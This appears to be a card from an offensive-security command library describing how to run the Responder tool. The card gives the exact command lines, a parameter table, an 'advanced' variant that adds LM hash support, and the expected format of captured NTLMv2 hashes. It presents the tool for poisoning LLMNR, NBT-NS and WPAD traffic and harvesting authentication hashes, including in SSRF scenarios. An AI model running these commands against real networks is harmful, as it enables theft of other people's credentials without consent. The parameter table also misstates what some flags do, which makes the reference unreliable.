---
id: 39a386fc-e280-42ca-a292-67b619c5f82b
name: responder-capture
type: command
executor: bash
data: python Responder.py -I eth0 -w -r -f -v
output: null
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:54.902Z'
platforms:
  - Linux
  - Windows
tags:
  - ntlm
  - capture
verified: false
validated: true
submitted: true
---

# responder-capture

## Command

```bash
python Responder.py -I eth0 -w -r -f -v
```

## Description

Starts the Responder tool to listen for and capture NTLM authentication hashes over network protocols like SMB and HTTP. Use this in SSRF scenarios to capture hashes leaked by forced authentications from vulnerable servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-I eth0` | Specify network interface to listen on | Yes |
| `-w` | Enable WPAD poisoning | No |
| `-r` | Enable NBT-NS poisoning | No |
| `-f` | Enable LLMNR poisoning | No |
| `-v` | Verbose output for detailed logs | No |

## Examples

### Basic Usage

```bash
python Responder.py -I eth0
```

### Advanced Usage

```bash
python Responder.py -I eth0 -w -r -f -v --lm
```

> Adds --lm for LM hash support.

## Expected Output

Responder binds to ports and logs: "[+] Listening for LLMNR/DNS/NBT-NS/WPAD on all interfaces". On capture: "[SMB] NTLMv2-SSP Hash: username::domain:challenge:hash".

## Related

- [[Related Procedure|procedures/Set-Up-NTLM-Capture-Server]]
